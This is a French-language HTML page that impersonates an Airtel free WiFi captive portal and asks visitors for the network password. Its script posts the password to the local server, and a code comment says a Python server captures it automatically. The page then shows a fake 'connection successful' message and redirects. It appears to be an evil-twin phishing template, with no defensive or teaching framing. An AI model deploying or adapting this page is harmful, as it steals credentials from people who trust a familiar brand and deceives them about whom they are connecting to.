<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>Airtel WiFi - Connexion Requise</title>
    <style>
        :root {
            --primary: #e3000b;
            --primary-dark: #a00008;
            --success: #28a745;
        }
        
        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
            font-family: 'Segoe UI', 'Arial', sans-serif; 
        }
        
        body { 
            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.4);
            animation: slideIn 0.6s ease-out;
        }
        
        @keyframes slideIn {
            from { 
                opacity: 0; 
                transform: translateY(30px) scale(0.95); 
            }
            to { 
                opacity: 1; 
                transform: translateY(0) scale(1); 
            }
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo-icon {
            font-size: 60px;
            color: var(--primary);
            margin-bottom: 15px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .logo h1 {
            color: var(--primary);
            font-size: 32px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }
        
        .logo p {
            color: #666;
            font-size: 14px;
            margin-top: 5px;
        }
        
        .alert {
            background: #fff3cd;
            border: 2px solid #ffc107;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            gap: 12px;
            animation: fadeIn 0.8s ease-out;
        }
        
        .alert i {
            color: #856404;
            font-size: 20px;
            flex-shrink: 0;
        }
        
        .alert-text {
            color: #856404;
            font-size: 14px;
            line-height: 1.5;
        }
        
        .form-group {
            margin-bottom: 25px;
            animation: fadeIn 1s ease-out;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 600;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .input-field {
            width: 100%;
            padding: 16px 20px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s;
            background: #fafafa;
        }
        
        .input-field:focus {
            border-color: var(--primary);
            background: white;
            outline: none;
            box-shadow: 0 0 0 3px rgba(227, 0, 11, 0.1);
        }
        
        .input-field[readonly] {
            background: #f5f5f5;
            color: #666;
            cursor: not-allowed;
        }
        
        .submit-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(to right, var(--primary), #ff3366);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            margin-top: 10px;
        }
        
        .submit-btn:hover {
            background: linear-gradient(to right, #ff0011, #ff5588);
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(227, 0, 11, 0.3);
        }
        
        .submit-btn:active {
            transform: translateY(-1px);
        }
        
        .submit-btn:disabled {
            background: #cccccc;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .status-message {
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            text-align: center;
            font-weight: 500;
            display: none;
            animation: fadeIn 0.5s;
        }
        
        .status-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .footer {
            margin-top: 30px;
            text-align: center;
            color: #888;
            font-size: 12px;
            border-top: 1px solid #eee;
            padding-top: 20px;
            animation: fadeIn 1.2s ease-out;
        }
        
        .footer a {
            color: var(--primary);
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .client-info {
            font-size: 11px;
            color: #aaa;
            margin-top: 10px;
            font-family: monospace;
        }
        
        /* Animation générale */
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <div class="logo-icon">📶</div>
            <h1>Airtel Free WiFi</h1>
            <p>Connexion Internet Haut Débit</p>
        </div>
        
        <div class="alert">
            <i>⚠️</i>
            <div class="alert-text">
                <strong>Connexion requise</strong><br>
                Pour accéder à Internet, veuillez saisir le mot de passe WiFi
            </div>
        </div>
        
        <div id="statusMessage" class="status-message"></div>
        
        <form id="loginForm" method="POST" action="/">
            <div class="form-group">
                <label for="ssid">Réseau WiFi</label>
                <input type="text" id="ssid" class="input-field" 
                       value="Airtel_Free_WiFi" readonly>
            </div>
            
            <div class="form-group">
                <label for="password">Mot de passe</label>
                <input type="password" id="password" name="password" 
                       class="input-field" 
                       placeholder="Saisissez le mot de passe du réseau" 
                       required autocomplete="off" autofocus>
            </div>
            
            <button type="submit" class="submit-btn" id="submitBtn">
                <span id="btnText">Se connecter à Internet</span>
                <div class="spinner" id="spinner"></div>
            </button>
        </form>
        
        <div class="footer">
            <p>© 2026 Airtel. Service de connexion WiFi gratuit.</p>
            <p>Connexion sécurisée - Redirection automatique</p>
            <div class="client-info" id="clientInfo"></div>
        </div>
    </div>

    <script>
    // Fonction pour mettre à jour les infos client
    function updateClientInfo() {
        const info = document.getElementById('clientInfo');
        info.innerHTML = `
            Navigateur: ${navigator.userAgent.split(' ')[0]}<br>
            Plateforme: ${navigator.platform}
        `;
    }
    
    // Fonction pour afficher un message de statut
    function showStatus(message, type) {
        const statusEl = document.getElementById('statusMessage');
        statusEl.textContent = message;
        statusEl.className = `status-message status-${type}`;
        statusEl.style.display = 'block';
        
        if (type === 'success') {
            setTimeout(() => {
                statusEl.style.display = 'none';
            }, 3000);
        }
    }
    
    // Gestion de la soumission du formulaire
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const btn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const spinner = document.getElementById('spinner');
        const password = document.getElementById('password').value;
        
        // Afficher l'état de chargement
        btnText.style.display = 'none';
        spinner.style.display = 'block';
        btn.disabled = true;
        
        // Afficher message
        showStatus('Authentification en cours...', 'success');
        
        // Simuler un délai
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        // Envoyer les données (le serveur Python capturera automatiquement)
        try {
            const formData = new FormData(this);
            
            const response = await fetch('/', {
                method: 'POST',
                body: new URLSearchParams(formData),
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                }
            });
            
            if (response.ok) {
                showStatus('✅ Connexion réussie ! Redirection...', 'success');
                
                // Rediriger après 2 secondes
                setTimeout(() => {
                    window.location.href = "accueil.html";
                }, 2000);
            } else {
                throw new Error('Erreur de connexion');
            }
            
        } catch (error) {
            showStatus('❌ Erreur de connexion. Réessayez.', 'error');
            
            // Réactiver le bouton
            btnText.style.display = 'block';
            spinner.style.display = 'none';
            btn.disabled = false;
        }
    });
    
    // Focus automatique sur le mot de passe
    document.addEventListener('DOMContentLoaded', function() {
        document.getElementById('password').focus();
        updateClientInfo();
        
        // Détection automatique de portail captif
        const testUrls = [
            'http://connectivitycheck.gstatic.com/generate_204',
            'http://captive.apple.com/hotspot-detect.html',
            'http://msftconnecttest.com/connecttest.txt'
        ];
        
        // Tester si on est déjà dans le portail captif
        testUrls.forEach(url => {
            fetch(url, { mode: 'no-cors', cache: 'no-store' })
                .catch(() => {
                    // Erreur attendue - nous sommes dans le portail captif
                });
        });
    });
    
    // Masquer/montrer le mot de passe
    let passwordVisible = false;
    window.togglePassword = function() {
        const passwordField = document.getElementById('password');
        passwordVisible = !passwordVisible;
        passwordField.type = passwordVisible ? 'text' : 'password';
    };
    </script>
    
    <!-- Font Awesome Icons -->
    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
</body>
</html>
